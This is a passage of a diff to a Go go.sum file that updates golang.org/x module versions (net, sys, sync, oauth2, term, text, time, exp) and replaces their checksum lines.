h1:ZjyILWgesfNpC6sMxTJOJm9Kp84zZh5NQWvqDGG3Qr8=\n-golang.org/x/exp v0.0.0-20190829153037-c13cbed26979/go.mod h1:86+5VVa7VpoJ4kLfm080zCjGlMRFzhUhsZKEZO7MGek=\n-golang.org/x/exp v0.0.0-20191030013958-a1ab85dbe136/go.mod h1:JXzH8nQsPlswgeRAPE3MuO9GYsAcnJvJ4vnMwN/5qkY=\n-golang.org/x/exp v0.0.0-20191129062945-2f5052295587/go.mod h1:2RIsYlXP63K8oxa1u096TMicItID8zy7Y6sNkU49FU4=\n-golang.org/x/exp v0.0.0-20191227195350-da58074b4299/go.mod h1:2RIsYlXP63K8oxa1u096TMicItID8zy7Y6sNkU49FU4=\n-golang.org/x/exp v0.0.0-20200119233911-0405dc783f0a/go.mod h1:2RIsYlXP63K8oxa1u096TMicItID8zy7Y6sNkU49FU4=\n-golang.org/x/exp v0.0.0-20200207192155-f17229e696bd/go.mod h1:J/WKrq2StrnmMY6+EHIKF9dgMWnmCNThgcyBT1FY9mM=\n-golang.org/x/exp v0.0.0-20200224162631-6cc2880d07d6/go.mod h1:3jZMyOhIsHpP37uCMkUooju7aAi5cS1Q23tOzKc+0MU=\n-golang.org/x/exp v0.0.0-20231108232855-2478ac86f678 h1:mchzmB1XO2pMaKFRqk/+MV3mgGG96aqaPXaMifQU47w=\n-golang.org/x/exp v0.0.0-20231108232855-2478ac86f678/go.mod h1:zk2irFbV9DP96SEBUUAy67IdHUaZuSnrz1n472HUCLE=\n-golang.org/x/image v0.0.0-20190227222117-0694c2d4d067/go.mod h1:kZ7UVZpmo3dzQBMxlp+ypCbDeSB+sBbTgSJuh5dn5js=\n-golang.org/x/image v0.0.0-20190802002840-cff245a6509b/go.mod h1:FeLwcggjj3mMvU+oOTbSwawSJRM1uh48EjtB4UJZlP0=\n+golang.org/x/exp v0.0.0-20240112132812-db7319d0e0e3 h1:hNQpMuAJe5CtcUqCXaWga3FHu+kQvCqcsoVaQgSV60o=\n+golang.org/x/exp v0.0.0-20240112132812-db7319d0e0e3/go.mod h1:idGWGoKP1toJGkd5/ig9ZLuPcZBC3ewk7SzmH0uou08=\n golang.org/x/lint v0.0.0-20181026193005-c67002cb31c3/go.mod h1:UVdnD1Gm6xHRNCYTkRU2/jEulfH38KcIWyp/GAMgvoE=\n golang.org/x/lint v0.0.0-20190227174305-5b3e6a55c961/go.mod h1:wehouNa3lNwaWXcvxsM5YxQ5yQlVC4a0KAMCusXpPoU=\n-golang.org/x/lint v0.0.0-20190301231843-5614ed5bae6f/go.mod h1:UVdnD1Gm6xHRNCYTkRU2/jEulfH38KcIWyp/GAMgvoE=\n golang.org/x/lint v0.0.0-20190313153728-d0100b6bd8b3/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=\n-golang.org/x/lint v0.0.0-20190409202823-959b441ac422/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=\n-golang.org/x/lint v0.0.0-20190909230951-414d861bb4ac/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=\n-golang.org/x/lint v0.0.0-20190930215403-16217165b5de/go.mod h1:6SW0HCj/g11FgYtHlgUYUwCkIfeOF89ocIRzGO/8vkc=\n-golang.org/x/lint v0.0.0-20191125180803-fdd1cda4f05f/go.mod h1:5qLYkcX4OjUUV8bRuDixDT3tpyyb+LUpUlRWLxfhWrs=\n-golang.org/x/lint v0.0.0-20200130185559-910be7a94367/go.mod h1:3xt1FjdF8hUf6vQPIChWIBhFzV8gjjsPE/fR3IyQdNY=\n-golang.org/x/lint v0.0.0-20200302205851-738671d3881b/go.mod h1:3xt1FjdF8hUf6vQPIChWIBhFzV8gjjsPE/fR3IyQdNY=\n-golang.org/x/mobile v0.0.0-20190312151609-d3739f865fa6/go.mod h1:z+o9i4GpDbdi3rU15maQ/Ox0txvL9dWGYEHz965HBQE=\n-golang.org/x/mobile v0.0.0-20190719004257-d2bd2a29d028/go.mod h1:E/iHnbuqvinMTCcRqshq8CkpyQDoeVncDDYHnLhea+o=\n-golang.org/x/mod v0.0.0-20190513183733-4bf6d317e70e/go.mod h1:mXi4GBBbnImb6dmsKGUJ2LatrhH/nqhxcFungHvyanc=\n-golang.org/x/mod v0.1.0/go.mod h1:0QHyrYULN0/3qlju5TqG8bIK38QM8yzMo5ekMj3DlcY=\n-golang.org/x/mod v0.1.1-0.20191105210325-c90efee705ee/go.mod h1:QqPTAvyqsEbceGzBzNggFXnrqF1CaUcvgkdR5Ot7KZg=\n-golang.org/x/mod v0.1.1-0.20191107180719-034126e5016b/go.mod h1:QqPTAvyqsEbceGzBzNggFXnrqF1CaUcvgkdR5Ot7KZg=\n golang.org/x/mod v0.2.0/go.mod h1:s0Qsj1ACt9ePp/hMypM3fl4fZqREWJwdYDEqhRiZZUA=\n golang.org/x/mod v0.3.0/go.mod h1:s0Qsj1ACt9ePp/hMypM3fl4fZqREWJwdYDEqhRiZZUA=\n golang.org/x/mod v0.6.0-dev.0.20220419223038-86c51ed26bb4/go.mod h1:jJ57K6gSWd91VN4djpZkiMVwK6gcyfeH4XE8wZrZaV4=\n\n@@ -892,36 +776,19 @@\ngolang.org/x/mod v0.17.0/go.mod h1:hTbmBsO62+eylJbnUtE2MGJUyE7QWk4xUqPFrRgJ+7c=\n golang.org/x/net v0.0.0-20180724234803-3673e40ba225/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n golang.org/x/net v0.0.0-20180826012351-8a410e7b638d/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n golang.org/x/net v0.0.0-20180906233101-161cd47e91fd/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n-golang.org/x/net v0.0.0-20190108225652-1e06a53dbb7e/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n golang.org/x/net v0.0.0-20190213061140-3a22650c66bd/go.mod h1:mL1N/T3taQHkDXs73rZJwtUhF3w3ftmwwsq0BUmARs4=\n golang.org/x/net v0.0.0-20190311183353-d8887717615a/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=\n golang.org/x/net v0.0.0-20190404232315-eb5bcb51f2a3/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=\n-golang.org/x/net v0.0.0-20190501004415-9ce7a6920f09/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=\n-golang.org/x/net v0.0.0-20190503192946-f4e77d36d62c/go.mod h1:t9HGtf8HONx5eT2rtn7q6eTqICYqUVnKs3thJo3Qplg=\n golang.org/x/net v0.0.0-20190603091049-60506f45cf65/go.mod h1:HSz+uSET+XFnRR8LxR5pz3Of3rY3CfYBVs4xY44aLks=\n golang.org/x/net v0.0.0-20190620200207-3b0461eec859/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n-golang.org/x/net v0.0.0-20190628185345-da137c7871d7/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n-golang.org/x/net v0.0.0-20190724013045-ca1201d0de80/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n-golang.org/x/net v0.0.0-20191209160850-c0dbc17a3553/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n-golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n-golang.org/x/net v0.0.0-20200202094626-16171245cfb2/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n-golang.org/x/net v0.0.0-20200222125558-5a598a2470a0/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n golang.org/x/net v0.0.0-20200226121028-0de0cce0169b/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n golang.org/x/net v0.0.0-20200301022130-244492dfa37a/go.mod h1:z5CRVTTTmAJ677TzLLGU+0bjPO0LkuOLi4/5GtJWs/s=\n-golang.org/x/net v0.0.0-20200324143707-d3edc9973b7e/go.mod h1:qpuaurCH72eLCgpAm/N6yyVIVM9cpaDIP3A8BGJEC5A=\n-golang.org/x/net v0.0.0-20200501053045-e0ff5e5a1de5/go.mod h1:qpuaurCH72eLCgpAm/N6yyVIVM9cpaDIP3A8BGJEC5A=\n golang.org/x/net v0.0.0-20200506145744-7e3656a0809f/go.mod h1:qpuaurCH72eLCgpAm/N6yyVIVM9cpaDIP3A8BGJEC5A=\n-golang.org/x/net v0.0.0-20200513185701-a91f0712d120/go.mod h1:qpuaurCH72eLCgpAm/N6yyVIVM9cpaDIP3A8BGJEC5A=\n golang.org/x/net v0.0.0-20200520004742-59133d7f0dd7/go.mod h1:qpuaurCH72eLCgpAm/N6yyVIVM9cpaDIP3A8BGJEC5A=\n-golang.org/x/net v0.0.0-20200520182314-0ba52f642ac2/go.mod h1:qpuaurCH72eLCgpAm/N6yyVIVM9cpaDIP3A8BGJEC5A=\n-golang.org/x/net v0.0.0-20200625001655-4c5254603344/go.mod h1:/O7V0waA8r7cgGh81Ro3o1hOxt32SMVPicZroKQ2sZA=\n-golang.org/x/net v0.0.0-20200707034311-ab3426394381/go.mod h1:/O7V0waA8r7cgGh81Ro3o1hOxt32SMVPicZroKQ2sZA=\n-golang.org/x/net v0.0.0-20200822124328-c89045814202/go.mod h1:/O7V0waA8r7cgGh81Ro3o1hOxt32SMVPicZroKQ2sZA=\n golang.org/x/net v0.0.0-20201010224723-4f7140c49acb/go.mod h1:sp8m0HH+o8qH0wwXwYZr8TS3Oi6o0r6Gce1SSxlDquU=\n golang.org/x/net v0.0.0-20201021035429-f5854403a974/go.mod h1:sp8m0HH+o8qH0wwXwYZr8TS3Oi6o0r6Gce1SSxlDquU=\n golang.org/x/net v0.0.0-20210226172049-e18ecbb05110/go.mod h1:m0MpNAwzfU5UDzcl9v0D8zg8gWTRqZa9RBIspLL5mdg=\n golang.org/x/net v0.0.0-20210428140749-89ef3d95e781/go.mod h1:OJAsFXCWl8Ukc7SiCT/9KSuxbyM7479/AVlXFRxuMCk=\n-golang.org/x/net v0.0.0-20210525063256-abc453219eb5/go.mod h1:9nx3DQGgdP8bBQD5qxJ1jj9UTztislL4KSBs9R2vV5Y=\n golang.org/x/net v0.0.0-20211112202133-69e39bad7dc2/go.mod h1:9nx3DQGgdP8bBQD5qxJ1jj9UTztislL4KSBs9R2vV5Y=\n golang.org/x/net v0.0.0-20220225172249-27dd8689420f/go.mod h1:CfG3xpIq0wQ8r1q4Su4UZFWDARRcnwPjda9FqA0JpMk=\n golang.org/x/net v0.0.0-20220607020251-c690dde0001d/go.mod h1:XRhObCWvk6IyKnWLug+ECip1KBveYUHfp+8e9klMJ9c=\n\n@@ -932,70 +799,39 @@\ngolang.org/x/net v0.7.0/go.mod h1:2Tu9+aMcznHK/AK1HMvgo6xiTLG5rD5rZLDS+rp2Bjs=\n golang.org/x/net v0.8.0/go.mod h1:QVkue5JL9kW//ek3r6jTKnTFis1tRmNAW2P1shuFdJc=\n golang.org/x/net v0.10.0/go.mod h1:0qNGK6F8kojg2nk9dLZ2mShWaEBan6FAoqfSigmmuDg=\n golang.org/x/net v0.11.0/go.mod h1:2L/ixqYpgIVXmeoSA/4Lu7BzTG4KIyPIryS4IsOd1oQ=\n-golang.org/x/net v0.26.0 h1:soB7SVo0PWrY4vPW/+ay0jKDNScG2X9wFeYlXIvJsOQ=\n-golang.org/x/net v0.26.0/go.mod h1:5YKkiSynbBIh3p6iOc/vibscux0x38BZDkn8sCUPxHE=\n+golang.org/x/net v0.34.0 h1:Mb7Mrk043xzHgnRM88suvJFwzVrRfHEHJEl5/71CKw0=\n+golang.org/x/net v0.34.0/go.mod h1:di0qlW3YNM5oh6GqDGQr92MyTozJPmybPK4Ev/Gm31k=\n golang.org/x/oauth2 v0.0.0-20180821212333-d2e6202438be/go.mod h1:N/0e6XlmueqKjAGxoOufVs8QHGRruUQn6yWY3a++T0U=\n-golang.org/x/oauth2 v0.0.0-20190226205417-e64efc72b421/go.mod h1:gOpvHmFTYa4IltrdGE7lF6nIHvwfUNPOp7c8zoXwtLw=\n-golang.org/x/oauth2 v0.0.0-20190604053449-0f29369cfe45/go.mod h1:gOpvHmFTYa4IltrdGE7lF6nIHvwfUNPOp7c8zoXwtLw=\n-golang.org/x/oauth2 v0.0.0-20191202225959-858c2ad4c8b6/go.mod h1:gOpvHmFTYa4IltrdGE7lF6nIHvwfUNPOp7c8zoXwtLw=\n-golang.org/x/oauth2 v0.0.0-20200107190931-bf48bf16ab8d/go.mod h1:gOpvHmFTYa4IltrdGE7lF6nIHvwfUNPOp7c8zoXwtLw=\n-golang.org/x/oauth2 v0.0.0-20210514164344-f6687ab2804c/go.mod h1:KelEdhl1UZF7XfJ4dDtk6s++YSgaE7mD/BuKKDLBl4A=\n-golang.org/x/oauth2 v0.20.0 h1:4mQdhULixXKP1rwYBW0vAijoXnkTG0BLCDRzfe1idMo=\n-golang.org/x/oauth2 v0.20.0/go.mod h1:XYTD2NtWslqkgxebSiOHnXEap4TF09sJSc7H1sXbhtI=\n+golang.org/x/oauth2 v0.21.0 h1:tsimM75w1tF/uws5rbeHzIWxEqElMehnc+iW793zsZs=\n+golang.org/x/oauth2 v0.21.0/go.mod h1:XYTD2NtWslqkgxebSiOHnXEap4TF09sJSc7H1sXbhtI=\n golang.org/x/sync v0.0.0-20180314180146-1d60e4601c6f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.0.0-20181108010431-42b317875d0f/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n-golang.org/x/sync v0.0.0-20181221193216-37e7f081c4d4/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n-golang.org/x/sync v0.0.0-20190227155943-e225da77a7e6/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.0.0-20190423024810-112230192c58/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.0.0-20190911185100-cd5d95a43a6e/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.0.0-20200317015054-43a5402ce75a/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n-golang.org/x/sync v0.0.0-20200625203802-6e8e738ad208/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.0.0-20201020160332-67f06af15bc9/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n-golang.org/x/sync v0.0.0-20201207232520-09787c993a3a/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.0.0-20220722155255-886fb9371eb4/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n golang.org/x/sync v0.1.0/go.mod h1:RxMgew5VJxzue5/jJTE5uejpjVlOe/izrB70Jof72aM=\n-golang.org/x/sync v0.7.0 h1:YsImfSBoP9QPYL0xyKJPq0gcaJdG3rInoqxTWbfQu9M=\n-golang.org/x/sync v0.7.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=\n+golang.org/x/sync v0.10.0 h1:3NQrjDixjgGwUOCaF8w2+VYHv0Ve/vGYSbdkTa98gmQ=\n+golang.org/x/sync v0.10.0/go.mod h1:Czt+wKu1gCyEFDUtn0jG5QVvpJ6rzVqr5aXyt9drQfk=\n golang.org/x/sys v0.0.0-20180830151530-49385e6e1522/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS+E42TnysNCUPdjciGhY=\n golang.org/x/sys v0.0.0-20180909124046-d0be0721c37e/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS+E42TnysNCUPdjciGhY=\n golang.org/x/sys v0.0.0-20190215142949-d0b11bdaac8a/go.mod h1:STP8DvDyc/dI5b8T5hshtkjS+E42TnysNCUPdjciGhY=\n-golang.org/x/sys v0.0.0-20190312061237-fead79001313/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20190412213103-97732733099d/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20190502145724-3ef323f4f1fd/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20190507160741-ecd444e8653b/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20190606165138-5da285871e9c/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20190624142023-c5567b49c5d0/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20190726091711-fc99dfbffb4e/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20190904154756-749cb33beabd/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20191001151750-bb3f8db39f24/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20191005200804-aed5e4c7ecf9/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20191026070338-33540a1f6037/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20191120155948-bd437916bb0e/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20191204072324-ce4227a45e2e/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20191228213918-04cbcbbfeed8/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200113162924-86b910548bc1/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200122134326-e047566fdf82/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200202164722-d101bd2416d5/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200212091648-12a6c2dcc1e4/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200223170610-d5e6a3e2c0ae/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200302150141-5c8b2ff67527/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20200323222414-85ca7c5b95cd/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200331124033-c3d80250170d/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200501052902-10377860bb8e/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20200509044756-6aff5f38e54f/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200511232937-7e40ca221e25/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200515095857-1151b9dac4a9/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200523222454-059865788121/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20200803210538-64077c9b5642/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20200930185726-fdedc70b468f/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20201119102817-f84b799fce68/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20210112080510-489259a85091/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20210119212857-b64e53b001e4/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n-golang.org/x/sys v0.0.0-20210124154548-22da62e12c0c/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20210423082822-04245dca01da/go.mod h1:h1NjWce9XRLGQEsW7wpKNCjG9DtNlClVuFLEZdDNbEs=\n golang.org/x/sys v0.0.0-20210615035016-665e8c7367d1/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.0.0-20211216021012-1d35b9e2eb4e/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n-golang.org/x/sys v0.0.0-20220114195835-da31bd327af9/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.0.0-20220412211240-33da011f77ad/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.0.0-20220520151302-bc2c85ada10a/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.0.0-20220715151400-c0bba94af5f8/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n\n@@ -1010,8 +846,8 @@\ngolang.org/x/sys v0.8.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.9.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.12.0/go.mod h1:oPkhp1MJrh7nUepCBck5+mAzfO9JrbApNNgaTdGDITg=\n golang.org/x/sys v0.17.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n-golang.org/x/sys v0.21.0 h1:rF+pYz3DAGSQAxAu1CbC7catZg4ebC4UIeIhKxBZvws=\n-golang.org/x/sys v0.21.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n+golang.org/x/sys v0.29.0 h1:TPYlXGxvx1MGTn2GiZDhnjPA9wZzZeGKHHmKhHYvgaU=\n+golang.org/x/sys v0.29.0/go.mod h1:/VUhepiaJMQUp4+oa/7Zr1D23ma6VTLIYjOOTFZPUcA=\n golang.org/x/term v0.0.0-20201126162022-7de9c90e9dd1/go.mod h1:bj7SfCRtBDWHUb9snDiAeCFNEtKQo2Wmx5Cou7ajbmo=\n golang.org/x/term v0.0.0-20210927222741-03fcf44c2211/go.mod h1:jbD1KX2456YbFQfuXm/mYQcufACuNUgVhRMnK/tPxf8=\n golang.org/x/term v0.2.0/go.mod h1:TVmDHMZPmdnySmBfhjOoOdhjzdE1h4u1VwSiw2l1Nuc=\n\n@@ -1021,11 +857,9 @@\ngolang.org/x/term v0.8.0/go.mod h1:xPskH00ivmX89bAKVGSKKtLOWNx2+17Eiy94tnKShWo=\n golang.org/x/term v0.9.0/go.mod h1:M6DEAAIenWoTxdKrOltXcmDY3rSplQUkrvaDU5FcQyo=\n golang.org/x/term v0.12.0/go.mod h1:owVbMEjm3cBLCHdkQu9b1opXd4ETQWc3BhuQGKgXgvU=\n golang.org/x/term v0.17.0/go.mod h1:lLRBjIVuehSbZlaOtGMbcMncT+aqLLLmKrsjNrUguwk=\n-golang.org/x/term v0.21.0 h1:WVXCp+/EBEHOj53Rvu+7KiT/iElMrO8ACK16SMZ3jaA=\n-golang.org/x/term v0.21.0/go.mod h1:ooXLefLobQVslOqselCNF4SxFAaoS6KujMbsGzSDmX0=\n-golang.org/x/text v0.0.0-20170915032832-14c0d48ead0c/go.mod h1:NqM8EUOU14njkJ3fqMW+pc6Ldnwhi/IjpwHt7yyuwOQ=\n+golang.org/x/term v0.28.0 h1:/Ts8HFuMR2E6IP/jlo7QVLZHggjKQbhu/7H0LJFr3Gg=\n+golang.org/x/term v0.28.0/go.mod h1:Sw/lC2IAUZ92udQNf3WodGtn4k/XoLyZoh8v/8uiwek=\n golang.org/x/text v0.3.0/go.mod h1:NqM8EUOU14njkJ3fqMW+pc6Ldnwhi/IjpwHt7yyuwOQ=\n-golang.org/x/text v0.3.1-0.20180807135948-17ff2d5776d2/go.mod h1:NqM8EUOU14njkJ3fqMW+pc6Ldnwhi/IjpwHt7yyuwOQ=\n golang.org/x/text v0.3.2/go.mod h1:bEr9sfX3Q8Zfm5fL9x+3itogRgK3+ptLWKqgva+5dAk=\n golang.org/x/text v0.3.3/go.mod h1:5Zoc/QRtKVWzQhOtBMvqHzDpF6irO9z98xDceosuGiQ=\n golang.org/x/text v0.3.5/go.mod h1:5Zoc/QRtKVWzQhOtBMvqHzDpF6irO9z98xDceosuGiQ=\n\n@@ -1038,56 +872,19 @@\ngolang.org/x/text v0.9.0/go.mod h1:e1OnstbJyHTd6l/uOt8jFFHp6TRDWZR/bV3emEE/zU8=\n golang.org/x/text v0.10.0/go.mod h1:TvPlkZtksWOMsz7fbANvkp4WM8x/WCo/om8BMLbz+aE=\n golang.org/x/text v0.13.0/go.mod h1:TvPlkZtksWOMsz7fbANvkp4WM8x/WCo/om8BMLbz+aE=\n golang.org/x/text v0.14.0/go.mod h1:18ZOQIKpY8NJVqYksKHtTdi31H5itFRjB5/qKTNYzSU=\n-golang.org/x/text v0.16.0 h1:a94ExnEXNtEwYLGJSIUxnWoxoRz/ZcCsV63ROupILh4=\n-golang.org/x/text v0.16.0/go.mod h1:GhwF1Be+LQoKShO3cGOHzqOgRrGaYc9AvblQOmPVHnI=\n-golang.org/x/time v0.0.0-20181108054448-85acf8d2951c/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I+vvW/OXSQhTDSoE431IQ=\n-golang.org/x/time v0.0.0-20190308202827-9d24e82272b4/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I+vvW/OXSQhTDSoE431IQ=\n-golang.org/x/time v0.0.0-20191024005414-555d28b269f0/go.mod h1:tRJNPiyCQ0inRvYxbN9jk5I+vvW/OXSQhTDSoE431IQ=\n-golang.org/x/time v0.5.0 h1:o7cqy6amK/52YcAKIPlM3a+Fpj35zvRj2TP+e1xFSfk=\n-golang.org/x/time v0.5.0/go.mod h1:3BpzKBy/shNhVucY/MWOyx10tF3SFh9QdLuxbVysPQM=\n+golang.org/x/text v0.21.0 h1:zyQAAkrwaneQ066sspRyJaG9VNi/YJ1NfzcGB3hZ/qo=\n+golang.org/x/text v0.21.0/go.mod h1:4IBbMaMmOPCJ8SecivzSH54+73PCFmPWxNTLm+vZkEQ=\n+golang.org/x/time v0.6.0 h1:eTDhh4ZXt5Qf0augr54TN6suAUudPcawVZeIAPU7D4U=\n+golang.org/x/time v0.6.0/go.mod h1:3BpzKBy/shNhVucY/MWOyx10tF3SFh9QdLuxbVysPQM=\n golang.org/x/tools v0.0.0-20180917221912-90fa682c2a6e/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=\n golang.org/x/tools v0.0.0-20190114222345-bf090417da8b/go.mod h1:n7NCudcB/nEzxVGmLbDWY5pfWTLqBcC2KZ6jyYvM4mQ=\n golang.org/x/tools v0.0.0-20190226205152-f727befe758c/go.mod h1:9Yl7xja0Znq3iFh3HoIrodX9oNMXvdceNzlUR8zjMvY=\n golang.org/x/tools v0.0.0-20190311212946-11955173bddd/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=\n-golang.org/x/tools v0.0.0-20190312151545-0bb0c0a6e846/go.mod h1:LCzVGOaR6xXOjkQ3onu1FJEFr0SW1gC7cKk1uF8kGRs=\n-golang.org/x/tools v0.0.0-20190312170243-e65039ee4138/go.mod 